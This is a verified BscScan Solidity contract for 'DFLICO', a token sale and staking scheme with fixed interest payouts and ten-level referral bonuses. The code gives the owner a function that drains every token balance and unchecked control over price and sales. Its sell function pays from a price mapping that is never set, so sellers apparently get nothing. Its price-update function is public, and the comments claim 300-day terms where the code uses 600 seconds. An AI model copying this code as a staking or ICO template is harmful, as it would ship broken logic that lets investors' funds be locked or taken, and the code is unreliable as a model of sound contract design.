/**
 *Submitted for verification at BscScan.com on 2021-08-27
*/

// Binance
// owner 0x6dA4867268c80BFcc1Fe4515A841eCa6299557Fb
// usdt  0xcf1aecc287027f797b99650b1e020ffa0fb0e248
// dfl   0xdc0be0aa580e5314b2acf889b540c8dd421a3cda
pragma solidity 0.5.4;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender)
  external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value)
  external returns (bool);
  
  function transferFrom(address from, address to, uint256 value)
  external returns (bool);
  function burn(uint256 value)
  external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract DFLICO  {
     using SafeMath for uint256;
     
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool    isExpired;
        uint256 genDividends;
        uint256 investmentToken;
        bool    isAddedStaked;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }
     
    struct User {
        uint id;
        address referrer;
        uint256 levelBonus;
        uint256 selfBuy;
        uint256 selfSell;
        uint256 planCount;
        uint256 totalStakingBusd;
        uint256 totalStakingToken;
        uint256 currentPercent;
        uint256 compoundBonus;
        uint256 freeStakedToken;
        mapping(uint256 => Investment) plans;
        mapping(uint256 => uint256) refInvest;
        mapping(uint256 => uint256) refMember;
    }
    
    bool public saleOpen=false;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    Plan[] private investmentPlans_;
    
    uint256 private constant INTEREST_CYCLE = 1 minutes;

    uint public lastUserId = 2;
    uint256 public tokenPrice=1e18;
    uint256  priceIncPercent=282;
    uint256  priceDecPercent=139;
    bool isAdminOpen;
    
    uint256 public  total_staking_token = 0;
    uint256 public  total_staking_busd = 0;
    uint256 public  total_virtual_staking = 0;
    
    uint256 public  total_withdraw_token = 0;
    uint256 public  total_withdraw_busd = 0;
    uint256 public  total_virtual_withdraw = 0;
    
    uint256 public  total_token_buy = 0;
	uint256 public  total_token_sale = 0;
	
	uint64 public  priceIndex = 1;
	bool   public  stakingOn = true;
	
	uint256 public  MINIMUM_BUY = 1e18;
	uint256 public  MINIMUM_SALE = 1e17;
	uint256 public  priceUpdateGap = 4*1e18;
	
	
    address public owner;
    
    mapping(uint64 => uint) public buyLevel;
    mapping(uint64 => uint) public priceLevel;

  
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId, uint256 block_timestamp);
    event CycleStarted(address indexed user, uint256 walletUsed, uint256 rewardUsed, uint256 block_timestamp);
    event TokenDistribution(address indexed sender, address indexed receiver, uint total_token, uint live_rate, uint bnb_amount, uint256 block_timestamp);
    event onWithdraw(address  _user, uint256 withdrawalAmount,uint256 withdrawalAmountToken, uint256 block_timestamp);
    event check(uint256 test,uint256 test1);
    IBEP20 private dflToken; 
    IBEP20 private busdToken; 

    constructor(address ownerAddress, IBEP20 _busdToken, IBEP20 _dflToken) public 
    {
        owner = ownerAddress;
        
        dflToken = _dflToken;
        busdToken = _busdToken;
        
        investmentPlans_.push(Plan(33,600,33)); //300 days and 0.33%
        investmentPlans_.push(Plan(42,600,42)); //300 days and 0.42%
        investmentPlans_.push(Plan(50,600,50)); //300 days and 0.5%
        investmentPlans_.push(Plan(58,600,58)); //300 days and 0.58%
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            levelBonus: uint(0),
            selfBuy: uint(0),
            selfSell: uint(0),
            planCount: uint(0),
            totalStakingBusd: uint(0),
            totalStakingToken: uint(0),
            currentPercent: uint(0),
            compoundBonus:uint(0),
            freeStakedToken:uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
    } 
    
    function() external payable 
    {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,0);
        }
        
        registration(msg.sender, bytesToAddress(msg.data),0);
    }

    function withdrawBalance(uint256 amt,uint8 _type) public 
    {
        require(msg.sender == owner, "onlyOwner");
        if(_type==1)
        msg.sender.transfer(amt);
        else if(_type==2)
        busdToken.transfer(msg.sender,amt);
        else
        dflToken.transfer(msg.sender,amt);
    }
    
   
    
    function registration(address userAddress, address referrerAddress,uint256 amount) private 
    {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            levelBonus: 0,
            selfBuy: 0,
            selfSell: 0,
            planCount: 0,
            totalStakingBusd: 0,
            totalStakingToken: 0,
            currentPercent: 0,
            compoundBonus: 0,
            freeStakedToken:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        lastUserId++;
        for(uint8 i=0;i<10;i++)
	    {
          users[referrerAddress].refMember[i]=users[referrerAddress].refMember[i]+1;
          users[referrerAddress].refInvest[i]=users[referrerAddress].refInvest[i]+amount;
             
          if(users[referrerAddress].referrer!=address(0))
          referrerAddress=users[referrerAddress].referrer;
          else
          break;
	    }

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id,block.timestamp);
    }
    
    function _invest(uint256 walletUsedBusd,uint256 rewardUsedBusd,uint256 compoundUsedBusd,uint256 _planId,address referrer) public 
    {
        require(stakingOn,"Staking Stopped.");
        uint256 walletUsed=(walletUsedBusd/tokenPrice)*1e18;
        require(dflToken.balanceOf(msg.sender)>=walletUsed,"Low wallet balance");
        require(dflToken.allowance(msg.sender,address(this))>=walletUsed,"Allow token first");
        
        require(users[msg.sender].levelBonus>=rewardUsedBusd,"Low reward balance");
        uint256 rewardUsed=(rewardUsedBusd/tokenPrice)*1e18;
        
        require(users[msg.sender].compoundBonus>=compoundUsedBusd,"Low Compound balance");
        uint256 compoundUsed=(compoundUsedBusd/tokenPrice)*1e18;
        
        require(_planId>=0 && _planId<investmentPlans_.length, "Wrong investment plan id");
        
        uint256 _amount=walletUsed+rewardUsed+compoundUsed;
        dflToken.transferFrom(msg.sender,address(this),walletUsed);
       
        uint256 _busdAmount=walletUsedBusd+rewardUsedBusd+compoundUsedBusd;
        require(_busdAmount>=2*1e18, "Minimum 2 Doller");
        
        if(!isUserExists(msg.sender))
	    {
	        registration(msg.sender, referrer,_amount);   
	    }
	    else
	    {
	        updateDividends();
	    }
	    require(isUserExists(msg.sender), "user not exists");
        uint256 planCount = users[msg.sender].planCount;
        users[msg.sender].levelBonus=users[msg.sender].levelBonus-rewardUsedBusd;
        users[msg.sender].compoundBonus=users[msg.sender].compoundBonus-compoundUsedBusd;
        
        users[msg.sender].plans[planCount].planId = _planId;
        users[msg.sender].plans[planCount].investmentDate = block.timestamp;
        users[msg.sender].plans[planCount].lastWithdrawalDate = block.timestamp;
        users[msg.sender].plans[planCount].investment = _busdAmount;
        users[msg.sender].plans[planCount].currentDividends = 0;
        users[msg.sender].plans[planCount].genDividends = 0;
        users[msg.sender].plans[planCount].isExpired = false;
        users[msg.sender].plans[planCount].investmentToken = _amount;
        users[msg.sender].planCount = users[msg.sender].planCount.add(1);
        users[msg.sender].totalStakingToken = users[msg.sender].totalStakingToken.add(_amount);
        users[msg.sender].totalStakingBusd = users[msg.sender].totalStakingBusd.add(_busdAmount);
        users[msg.sender].currentPercent=getStakingPercent(msg.sender);
        
        if(msg.sender!=owner)
	    _calculateReferrerReward(_busdAmount,users[msg.sender].referrer);
	    total_staking_busd=total_staking_busd+_busdAmount;
	    total_virtual_staking=total_virtual_staking+_busdAmount;
	    total_staking_token=total_staking_token+_amount;
	    
	    if(total_virtual_staking>=priceUpdateGap && !isAdminOpen)
	    updateTokenPrice(1);
	    
	    emit CycleStarted(msg.sender, walletUsed, rewardUsed,block.timestamp);
    }

    function buyToken(uint256 tokenQty) public payable
	{
	     require(!isContract(msg.sender),"Can not be contract");
	     require(tokenQty>=MINIMUM_BUY,"Invalid minimum quantity");
	     uint256 buy_amt=(tokenQty/1e18)*tokenPrice;
	     require(busdToken.balanceOf(msg.sender)>=(buy_amt),"Low Balance");
	     require(busdToken.allowance(msg.sender,address(this))>=buy_amt,"Invalid buy amount");
	     
	     users[msg.sender].selfBuy=users[msg.sender].selfBuy+tokenQty;
	     busdToken.transferFrom(msg.sender ,address(this), (buy_amt));
	     dflToken.transfer(msg.sender , tokenQty);
	     
         total_token_buy=total_token_buy+tokenQty;
		 emit TokenDistribution(address(this), msg.sender, tokenQty, tokenPrice, buy_amt,block.timestamp);					
	 }
	 
	function sellToken(uint256 tokenQty) public payable 
	{
	    address userAddress=msg.sender;
	    require(isUserExists(userAddress), "user is not exists. Register first.");
	    require(saleOpen,"Sale Stopped.");
	    require(dflToken.balanceOf(userAddress)>=(tokenQty),"Low Balance");
	    require(dflToken.allowance(userAddress,address(this))>=(tokenQty),"Approve your token First");
	    require(!isContract(userAddress),"Can not be contract");
	    
	    uint256 busd_amt=(tokenQty/1e18)*priceLevel[priceIndex];
	     
		dflToken.transferFrom(userAddress ,address(this), (tokenQty));
		busdToken.transfer(userAddress ,busd_amt);
		 
		users[msg.sender].selfSell=users[msg.sender].selfSell+tokenQty;
		emit TokenDistribution(userAddress,address(this), tokenQty, priceLevel[priceIndex],busd_amt,block.timestamp);
		total_token_sale=total_token_sale+tokenQty;
	 }
	 
	function _calculateReferrerReward(uint256 _investment, address _referrer) private 
	{
	     uint256 oldPercent;
	     uint256 totalPercent;
	     for(uint8 i=0;i<10;i++)
	     {
	         uint256 refPercent=getPercent(_referrer);
	         if(refPercent>oldPercent && totalPercent<250)
	         {
	            uint256 left=refPercent-oldPercent;
	            totalPercent=totalPercent+left;
	            if(left>0)
	            {
    	            if(users[_referrer].totalStakingBusd>=_investment)
    	            users[_referrer].levelBonus=users[_referrer].levelBonus+(_investment*left)/1000;
    	            else
    	            {
    	                uint256 rest=_investment-users[_referrer].totalStakingBusd;
    	                users[_referrer].levelBonus=users[_referrer].levelBonus+(users[_referrer].totalStakingBusd*left)/1000; 
    	                users[_referrer].compoundBonus=users[_referrer].compoundBonus+(rest*left)/1000; 
    	            }
	            }
	            oldPercent=refPercent;
	         }
	         
             users[_referrer].refInvest[i]=users[_referrer].refInvest[i]+_investment;
             if(users[_referrer].referrer!=address(0))
             _referrer=users[_referrer].referrer;
             else
             break;
	     }
     }
	
	function withdraw() public payable 
	{
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = users[msg.sender].id;
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < users[msg.sender].planCount; i++) 
        {
            if (users[msg.sender].plans[i].isExpired) {
                continue;
            }

            Plan storage plan = investmentPlans_[users[msg.sender].plans[i].planId];

            bool isExpired = false;
            bool isAddedStaked = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = users[msg.sender].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                    users[msg.sender].freeStakedToken=users[msg.sender].freeStakedToken+users[msg.sender].plans[i].investmentToken;
                    isAddedStaked=true;
                }
            }

            uint256 amount = _calculateDividends(users[msg.sender].plans[i].investment , users[msg.sender].currentPercent , withdrawalDate , users[msg.sender].plans[i].lastWithdrawalDate , users[msg.sender].currentPercent);

            withdrawalAmount += amount;
            withdrawalAmount += users[msg.sender].plans[i].genDividends;
            
            users[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            users[msg.sender].plans[i].isExpired = isExpired;
            users[msg.sender].plans[i].isAddedStaked = isAddedStaked;
            users[msg.sender].plans[i].currentDividends += amount;
            users[msg.sender].plans[i].genDividends=0;
        }
        
        uint256 totalToken=users[msg.sender].freeStakedToken+(((users[msg.sender].levelBonus.add(withdrawalAmount)).div(tokenPrice)).mul(1e18));
        dflToken.transfer(msg.sender,totalToken);
        total_withdraw_busd=total_withdraw_busd+(totalToken*tokenPrice);
        total_withdraw_token=total_withdraw_token+(totalToken);
        total_virtual_withdraw=total_virtual_withdraw+totalToken;
         if(total_virtual_withdraw>priceUpdateGap)
         updateTokenPrice(2);
        emit onWithdraw(msg.sender, withdrawalAmount,totalToken,block.timestamp);
    }
    
    
    function updateDividends() private
	{
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = users[msg.sender].id;
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < users[msg.sender].planCount; i++) 
        {
            if (users[msg.sender].plans[i].isExpired) {
                continue;
            }

            Plan storage plan = investmentPlans_[users[msg.sender].plans[i].planId];

            bool isExpired = false;
            bool isAddedStaked = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = users[msg.sender].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                    isAddedStaked=true;
                    users[msg.sender].freeStakedToken=users[msg.sender].freeStakedToken+users[msg.sender].plans[i].investmentToken;
                }
            }

            uint256 amount = _calculateDividends(users[msg.sender].plans[i].investment , users[msg.sender].currentPercent , withdrawalDate , users[msg.sender].plans[i].lastWithdrawalDate , users[msg.sender].currentPercent);

            withdrawalAmount += amount;
            
            users[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            users[msg.sender].plans[i].isExpired = isExpired;
            users[msg.sender].plans[i].isAddedStaked = isAddedStaked;
            users[msg.sender].plans[i].currentDividends += amount;
            users[msg.sender].plans[i].genDividends += amount;
        }
    }
    
    function getInvestmentPlanByUID(address _user) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory, bool[] memory) 
    {
       
        User storage investor = users[_user];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory genDividends = new uint256[](investor.planCount);
        bool[] memory isAddedStakeds = new bool[](investor.planCount);

        for(uint256 i=0; i<investor.planCount; i++){
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            genDividends[i] = investor.plans[i].genDividends;
            isAddedStakeds[i] = investor.plans[i].isAddedStaked;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
                
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.currentPercent, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investor.currentPercent);
                        isExpireds[i] = true;
                       
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.currentPercent, block.timestamp, investor.plans[i].lastWithdrawalDate, investor.currentPercent);
                      
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investor.currentPercent, block.timestamp, investor.plans[i].lastWithdrawalDate, investor.currentPercent);
                 
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        genDividends,
        isExpireds,
        isAddedStakeds
        );
    }
    
    function getInvestmentToken(address _user) public view returns (uint256[] memory) 
    {
       
        User storage investor = users[_user];
        uint256[] memory investments = new  uint256[](investor.planCount);

        for(uint256 i=0; i<investor.planCount; i++){
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            investments[i] = investor.plans[i].investmentToken;
        }

        return
        (
            investments
        );
    }

	function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 10000 * INTEREST_CYCLE) / (60);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 10000 * secondsLeft) / (60);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 10000 * (_now - _start)) / (60);
        }

    }

	function updateTokenPrice(uint8 _type) public
	{
	   if(_type==1)
	   {
	     while(true)
	     {
	         uint256 tempPrice=(tokenPrice*priceIncPercent)/1000000;
	         tokenPrice=tokenPrice+tempPrice;
	         total_virtual_staking=total_virtual_staking-priceUpdateGap;
	         if(total_virtual_staking<priceUpdateGap)
	         return;
	     }
	   }
	   else
	   {
	     while(true)
	     {
	         uint256 tempPrice=(tokenPrice.mul(priceDecPercent)).div(1000000);
	         tokenPrice=tokenPrice-tempPrice;
	         total_virtual_withdraw=total_virtual_withdraw-priceUpdateGap;
	         if(total_virtual_withdraw<priceUpdateGap)
	         return;
	     }
	   }
	}
	
	function getStakingPercent(address _user) public view returns(uint16)
	{
	    require(isUserExists(_user),"User Not Exist");
	    
	    if(users[_user].totalStakingBusd>=15*1e18)
	    return 58;
	    else if(users[_user].totalStakingBusd>=10*1e18)
	    return 50;
	    else if(users[_user].totalStakingBusd>=5*1e18)
	    return 42;
	    else
	    return 33;
	}


	function getPercent(address _user) public view returns(uint16)
	{
	    require(isUserExists(_user),"User Not Exist");
	    uint256 totalDirect=users[_user].refMember[0];
	    uint256 totalTeam;
	    for(uint8 i=0;i<10;i++)
	    {
	       totalTeam=totalTeam+users[_user].refMember[i]; 
	    }
	    
	    if(totalDirect>=4 && totalTeam>=5)
	    return 250;
	    else if(totalDirect>=3 && totalTeam>=4)
	    return 200;
	    else if(totalDirect>=2 && totalTeam>=3)
	    return 150;
	    else
	    return 50;
	}

    function isContract(address _address) public view returns (bool _isContract)
    {
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    }    
  
    function token_setting(uint min_buy,  uint min_sale) public payable
    {
              require(msg.sender==owner,"Only Owner");
              MINIMUM_BUY = min_buy;
    	      MINIMUM_SALE = min_sale;
    }
    
    function openAdminPrice(uint8 _type) public payable
    {
              require(msg.sender==owner,"Only Owner");
              if(_type==1)
              isAdminOpen=true;
              else
              {
                isAdminOpen=false;
                total_virtual_staking=0;
              }
    }
    
    
    function updatePrice(uint256 _price) public payable
    {
              require(msg.sender==owner,"Only Owner");
              require(isAdminOpen,"Admin option not open.");
              tokenPrice=_price;
    }
    
    function stakingSwitch(uint8 _type) public payable
    {
        require(msg.sender==owner,"Only Owner");
            if(_type==1)
            stakingOn=true;
            else
            stakingOn=false;
    }
    
    function sale_setting(uint8 _type) public payable
    {
        require(msg.sender==owner,"Only Owner");
            if(_type==1)
            saleOpen=true;
            else
            saleOpen=false;
    }
    
    
    function isUserExists(address user) public view returns (bool) 
    {
        return (users[user].id != 0);
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}